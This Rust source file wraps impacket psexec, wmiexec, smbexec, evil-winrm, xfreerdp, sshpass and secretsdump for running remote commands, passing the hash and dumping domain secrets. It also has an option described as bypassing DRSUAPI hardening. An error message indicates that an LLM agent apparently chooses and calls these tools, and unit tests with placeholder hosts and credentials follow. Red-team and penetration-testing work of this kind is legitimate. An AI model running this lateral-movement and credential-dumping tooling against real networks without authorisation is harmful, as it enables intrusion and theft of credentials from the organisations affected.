//! Remote execution tool executors (psexec, wmiexec, smbexec, evil-winrm,
//! xfreerdp, ssh, secretsdump_kerberos).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Reject calls that would land impacket in an interactive `getpass()` prompt.
/// Without password or hash, impacket asks the controlling TTY for a password
/// and crashes with EOFError when run from a non-interactive worker.
fn require_password_or_hash(
    tool: &str,
    username: &str,
    domain: Option<&str>,
    password: Option<&str>,
    hash: Option<&str>,
) -> Result<()> {
    if password.is_none() && hash.is_none() {
        anyhow::bail!(
            "{tool} requires a password or hash for {username}@{} but none was \
             supplied. Credentials must be present in operation state for the \
             (username, domain) pair so the resolver can inject them, or the \
             LLM must call the *_kerberos variant with a valid ticket. Refusing \
             to run because impacket would call getpass() and crash on no-TTY.",
            domain.unwrap_or("(no domain)")
        );
    }
    Ok(())
}

/// Execute a command on a remote host via impacket-psexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn psexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command =
        optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);

    require_password_or_hash("psexec", username, domain, password, hash)?;

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-psexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-psexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn psexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command =
        optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-psexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-wmiexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn wmiexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("whoami");

    require_password_or_hash("wmiexec", username, domain, password, hash)?;

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-wmiexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-wmiexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn wmiexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-wmiexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-smbexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn smbexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("whoami");

    require_password_or_hash("smbexec", username, domain, password, hash)?;

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-smbexec")
        .arg(&auth_str)
        .args(extra_args)
        .flag("-c", command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-smbexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn smbexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-smbexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .flag("-c", command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via evil-winrm.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `command`
pub async fn evil_winrm(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let command = optional_str(args, "command").unwrap_or("whoami && hostname && ipconfig");

    let mut cmd = CommandBuilder::new("evil-winrm")
        .flag("-i", target)
        .flag("-u", username);

    cmd = match hash {
        Some(h) => cmd.flag("-H", h),
        None => match password {
            Some(p) => cmd.flag("-p", p),
            None => cmd,
        },
    };

    cmd.flag("-c", command).timeout_secs(120).execute().await
}

/// Test RDP authentication via xfreerdp.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`
pub async fn xfreerdp(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("xfreerdp")
        .arg(format!("/v:{target}"))
        .arg(format!("/u:{username}"));

    cmd = match hash {
        Some(h) => cmd.arg(format!("/pth:{h}")),
        None => match password {
            Some(p) => cmd.arg(format!("/p:{p}")),
            None => cmd,
        },
    };

    if let Some(d) = domain {
        cmd = cmd.arg(format!("/d:{d}"));
    }

    cmd.arg("/cert-ignore")
        .arg("+auth-only")
        .env("HOME", "/root")
        .timeout_secs(30)
        .execute()
        .await
}

/// Execute a command on a remote host via SSH with password authentication.
///
/// Required args: `target`, `username`, `password`
/// Optional args: `port`, `command`
pub async fn ssh_with_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let port = optional_str(args, "port");
    let command = optional_str(args, "command").unwrap_or("whoami && hostname");

    let user_host = format!("{username}@{target}");

    let mut cmd = CommandBuilder::new("sshpass")
        .flag("-p", password)
        .arg("ssh")
        .arg("-o")
        .arg("StrictHostKeyChecking=no")
        .arg(&user_host);

    if let Some(p) = port {
        cmd = cmd.flag("-p", p);
    }

    cmd.arg(command).timeout_secs(120).execute().await
}

/// Dump secrets from a remote host via impacket-secretsdump with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`,
///                `just_dc_user` (single account, e.g. `krbtgt`),
///                `use_vss` (bool — use VSS method to bypass DRSUAPI hardening)
pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let just_dc_user = optional_str(args, "just_dc_user");
    let use_vss = crate::args::optional_bool(args, "use_vss").unwrap_or(false);
    let timeout_minutes = optional_i64(args, "timeout_minutes").unwrap_or(3);
    let timeout_secs = (timeout_minutes * 60) as u64;

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    let mut cmd = CommandBuilder::new("impacket-secretsdump")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .flag_opt("-just-dc-user", just_dc_user)
        .env(env_key, env_val);

    if use_vss {
        cmd = cmd.arg("-use-vss");
    }

    cmd.timeout_secs(timeout_secs).execute().await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_i64, optional_str, required_str};
    use crate::credentials;
    use serde_json::json;

    // --- psexec ---

    #[test]
    fn psexec_requires_target() {
        let args = json!({"username": "admin"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn psexec_requires_username() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn psexec_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin"});
        let command = optional_str(&args, "command")
            .unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);
        assert_eq!(command, r#"cmd.exe /c "whoami && hostname && ipconfig""#);
    }

    #[test]
    fn psexec_custom_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin", "command": "dir C:\\"});
        let command = optional_str(&args, "command")
            .unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);
        assert_eq!(command, "dir C:\\");
    }

    #[test]
    fn psexec_impacket_auth_with_password() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "domain": "CONTOSO"
        });
        let target = required_str(&args, "target").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = optional_str(&args, "password");
        let hash = optional_str(&args, "hash");
        let domain = optional_str(&args, "domain");
        let (auth_str, extra_args) =
            credentials::impacket_auth(domain, username, password, hash, target);
        assert_eq!(auth_str, "CONTOSO/admin:P@ss@192.168.58.1");
        assert!(extra_args.is_empty());
    }

    #[test]
    fn psexec_impacket_auth_with_hash() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "hash": "aabbccdd",
            "domain": "CONTOSO"
        });
        let target = required_str(&args, "target").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = optional_str(&args, "password");
        let hash = optional_str(&args, "hash");
        let domain = optional_str(&args, "domain");
        let (auth_str, extra_args) =
            credentials::impacket_auth(domain, username, password, hash, target);
        assert_eq!(auth_str, "CONTOSO/admin@192.168.58.1");
        assert_eq!(extra_args, vec!["-hashes", ":aabbccdd"]);
    }

    // --- psexec_kerberos ---

    #[test]
    fn psexec_kerberos_target_format() {
        let args = json!({
            "target": "dc01.contoso.local",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache"
        });
        let target = required_str(&args, "target").unwrap();
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let target_str = format!("{domain}/{username}@{target}");
        assert_eq!(target_str, "contoso.local/admin@dc01.contoso.local");
    }

    #[test]
    fn psexec_kerberos_env() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache"
        });
        let ticket_path = required_str(&args, "ticket_path").unwrap();
        let (env_key, env_val) = credentials::kerberos_env(ticket_path);
        assert_eq!(env_key, "KRB5CCNAME");
        assert_eq!(env_val, "/tmp/admin.ccache");
    }

    #[test]
    fn psexec_kerberos_requires_domain() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "ticket_path": "/tmp/admin.ccache"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn psexec_kerberos_requires_ticket_path() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "ticket_path").is_err());
    }

    #[test]
    fn psexec_kerberos_default_command() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache"
        });
        let command = optional_str(&args, "command")
            .unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);
        assert_eq!(command, r#"cmd.exe /c "whoami && hostname && ipconfig""#);
    }

    #[test]
    fn psexec_kerberos_optional_dc_ip() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache",
            "dc_ip": "192.168.58.1"
        });
        assert_eq!(optional_str(&args, "dc_ip"), Some("192.168.58.1"));
    }

    // --- wmiexec ---

    #[test]
    fn wmiexec_requires_target() {
        let args = json!({"username": "admin"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn wmiexec_requires_username() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn wmiexec_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin"});
        let command = optional_str(&args, "command").unwrap_or("whoami");
        assert_eq!(command, "whoami");
    }

    // --- wmiexec_kerberos ---

    #[test]
    fn wmiexec_kerberos_target_format() {
        let domain = "contoso.local";
        let username = "svc_sql";
        let target = "sql01.contoso.local";
        let target_str = format!("{domain}/{username}@{target}");
        assert_eq!(target_str, "contoso.local/svc_sql@sql01.contoso.local");
    }

    #[test]
    fn wmiexec_kerberos_default_command() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache"
        });
        let command = optional_str(&args, "command").unwrap_or("whoami");
        assert_eq!(command, "whoami");
    }

    // --- smbexec ---

    #[test]
    fn smbexec_requires_target() {
        let args = json!({"username": "admin"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn smbexec_requires_username() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn smbexec_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin"});
        let command = optional_str(&args, "command").unwrap_or("whoami");
        assert_eq!(command, "whoami");
    }

    // --- smbexec_kerberos ---

    #[test]
    fn smbexec_kerberos_target_format() {
        let domain = "child.contoso.local";
        let username = "admin";
        let target = "dc02.child.contoso.local";
        let target_str = format!("{domain}/{username}@{target}");
        assert_eq!(
            target_str,
            "child.contoso.local/admin@dc02.child.contoso.local"
        );
    }

    // --- evil_winrm ---

    #[test]
    fn evil_winrm_default_command() {
        let args = json!({"target": "192.168.58.1", "username": "admin"});
        let command = optional_str(&args, "command").unwrap_or("whoami && hostname && ipconfig");
        assert_eq!(command, "whoami && hostname && ipconfig");
    }

    #[test]
    fn evil_winrm_hash_takes_precedence_over_password() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "hash": "aabbccdd"
        });
        let hash = optional_str(&args, "hash");
        let password = optional_str(&args, "password");
        // The function uses match hash { Some(h) => ..., None => match password ... }
        // so hash takes precedence when both are present.
        assert!(hash.is_some());
        assert!(password.is_some());
        let used_flag = match hash {
            Some(h) => format!("-H {h}"),
            None => match password {
                Some(p) => format!("-p {p}"),
                None => String::new(),
            },
        };
        assert_eq!(used_flag, "-H aabbccdd");
    }

    #[test]
    fn evil_winrm_password_only() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "Secret123"
        });
        let hash = optional_str(&args, "hash");
        let password = optional_str(&args, "password");
        let used_flag = match hash {
            Some(h) => format!("-H {h}"),
            None => match password {
                Some(p) => format!("-p {p}"),
                None => String::new(),
            },
        };
        assert_eq!(used_flag, "-p Secret123");
    }

    #[test]
    fn evil_winrm_no_creds() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin"
        });
        let hash = optional_str(&args, "hash");
        let password = optional_str(&args, "password");
        let used_flag = match hash {
            Some(h) => format!("-H {h}"),
            None => match password {
                Some(p) => format!("-p {p}"),
                None => String::new(),
            },
        };
        assert!(used_flag.is_empty());
    }

    // --- xfreerdp ---

    #[test]
    fn xfreerdp_target_format() {
        let target = "192.168.58.1";
        assert_eq!(format!("/v:{target}"), "/v:192.168.58.1");
    }

    #[test]
    fn xfreerdp_username_format() {
        let username = "admin";
        assert_eq!(format!("/u:{username}"), "/u:admin");
    }

    #[test]
    fn xfreerdp_hash_format() {
        let hash = "aabbccdd";
        assert_eq!(format!("/pth:{hash}"), "/pth:aabbccdd");
    }

    #[test]
    fn xfreerdp_password_format() {
        let password = "P@ss";
        assert_eq!(format!("/p:{password}"), "/p:P@ss");
    }

    #[test]
    fn xfreerdp_domain_format() {
        let domain = "CONTOSO";
        assert_eq!(format!("/d:{domain}"), "/d:CONTOSO");
    }

    #[test]
    fn xfreerdp_hash_precedence() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "hash": "aabbccdd"
        });
        let hash = optional_str(&args, "hash");
        let password = optional_str(&args, "password");
        let auth_arg = match hash {
            Some(h) => format!("/pth:{h}"),
            None => match password {
                Some(p) => format!("/p:{p}"),
                None => String::new(),
            },
        };
        assert_eq!(auth_arg, "/pth:aabbccdd");
    }

    // --- ssh_with_password ---

    #[test]
    fn ssh_user_host_format() {
        let username = "root";
        let target = "192.168.58.5";
        let user_host = format!("{username}@{target}");
        assert_eq!(user_host, "root@192.168.58.5");
    }

    #[test]
    fn ssh_requires_password() {
        let args = json!({"target": "192.168.58.1", "username": "root"});
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn ssh_default_command() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "root",
            "password": "toor"
        });
        let command = optional_str(&args, "command").unwrap_or("whoami && hostname");
        assert_eq!(command, "whoami && hostname");
    }

    #[test]
    fn ssh_optional_port() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "root",
            "password": "toor",
            "port": "2222"
        });
        assert_eq!(optional_str(&args, "port"), Some("2222"));
    }

    #[test]
    fn ssh_no_port() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "root",
            "password": "toor"
        });
        assert!(optional_str(&args, "port").is_none());
    }

    // --- secretsdump_kerberos ---

    #[test]
    fn secretsdump_kerberos_target_format() {
        let domain = "contoso.local";
        let username = "admin";
        let target = "dc01.contoso.local";
        let target_str = format!("{domain}/{username}@{target}");
        assert_eq!(target_str, "contoso.local/admin@dc01.contoso.local");
    }

    #[test]
    fn secretsdump_kerberos_default_timeout() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache"
        });
        let timeout_minutes = optional_i64(&args, "timeout_minutes").unwrap_or(3);
        let timeout_secs = (timeout_minutes * 60) as u64;
        assert_eq!(timeout_minutes, 3);
        assert_eq!(timeout_secs, 180);
    }

    #[test]
    fn secretsdump_kerberos_custom_timeout() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local",
            "ticket_path": "/tmp/admin.ccache",
            "timeout_minutes": 10
        });
        let timeout_minutes = optional_i64(&args, "timeout_minutes").unwrap_or(3);
        let timeout_secs = (timeout_minutes * 60) as u64;
        assert_eq!(timeout_minutes, 10);
        assert_eq!(timeout_secs, 600);
    }

    #[test]
    fn secretsdump_kerberos_requires_domain() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "ticket_path": "/tmp/admin.ccache"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn secretsdump_kerberos_requires_ticket_path() {
        let args = json!({
            "target": "dc01",
            "username": "admin",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "ticket_path").is_err());
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn psexec_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "CONTOSO"
        });
        assert!(super::psexec(&args).await.is_ok());
    }

    #[tokio::test]
    async fn psexec_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd", "domain": "CONTOSO"
        });
        assert!(super::psexec(&args).await.is_ok());
    }

    #[tokio::test]
    async fn psexec_kerberos_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "dc01.contoso.local", "username": "admin",
            "domain": "contoso.local", "ticket_path": "/tmp/admin.ccache"
        });
        assert!(super::psexec_kerberos(&args).await.is_ok());
    }

    #[tokio::test]
    async fn psexec_kerberos_with_dc_ip_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "dc01.contoso.local", "username": "admin",
            "domain": "contoso.local", "ticket_path": "/tmp/admin.ccache",
            "dc_ip": "192.168.58.1", "target_ip": "192.168.58.1"
        });
        assert!(super::psexec_kerberos(&args).await.is_ok());
    }

    #[tokio::test]
    async fn wmiexec_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "CONTOSO"
        });
        assert!(super::wmiexec(&args).await.is_ok());
    }

    #[tokio::test]
    async fn wmiexec_kerberos_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "dc01.contoso.local", "username": "admin",
            "domain": "contoso.local", "ticket_path": "/tmp/admin.ccache"
        });
        assert!(super::wmiexec_kerberos(&args).await.is_ok());
    }

    #[tokio::test]
    async fn smbexec_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "password": "P@ss"
        });
        assert!(super::smbexec(&args).await.is_ok());
    }

    #[tokio::test]
    async fn smbexec_kerberos_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "dc01.contoso.local", "username": "admin",
            "domain": "contoso.local", "ticket_path": "/tmp/admin.ccache"
        });
        assert!(super::smbexec_kerberos(&args).await.is_ok());
    }

    #[tokio::test]
    async fn evil_winrm_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "password": "P@ss"
        });
        assert!(super::evil_winrm(&args).await.is_ok());
    }

    #[tokio::test]
    async fn evil_winrm_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "hash": "aabbccdd"
        });
        assert!(super::evil_winrm(&args).await.is_ok());
    }

    #[tokio::test]
    async fn evil_winrm_no_creds_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin"
        });
        assert!(super::evil_winrm(&args).await.is_ok());
    }

    #[tokio::test]
    async fn xfreerdp_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "password": "P@ss"
        });
        assert!(super::xfreerdp(&args).await.is_ok());
    }

    #[tokio::test]
    async fn xfreerdp_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd", "domain": "CONTOSO"
        });
        assert!(super::xfreerdp(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ssh_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "root", "password": "toor"
        });
        assert!(super::ssh_with_password(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ssh_with_port_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "root",
            "password": "toor", "port": "2222"
        });
        assert!(super::ssh_with_password(&args).await.is_ok());
    }

    #[tokio::test]
    async fn secretsdump_kerberos_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "dc01.contoso.local", "username": "admin",
            "domain": "contoso.local", "ticket_path": "/tmp/admin.ccache"
        });
        assert!(super::secretsdump_kerberos(&args).await.is_ok());
    }

    #[tokio::test]
    async fn secretsdump_kerberos_custom_timeout_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "dc01.contoso.local", "username": "admin",
            "domain": "contoso.local", "ticket_path": "/tmp/admin.ccache",
            "timeout_minutes": 10
        });
        assert!(super::secretsdump_kerberos(&args).await.is_ok());
    }
}
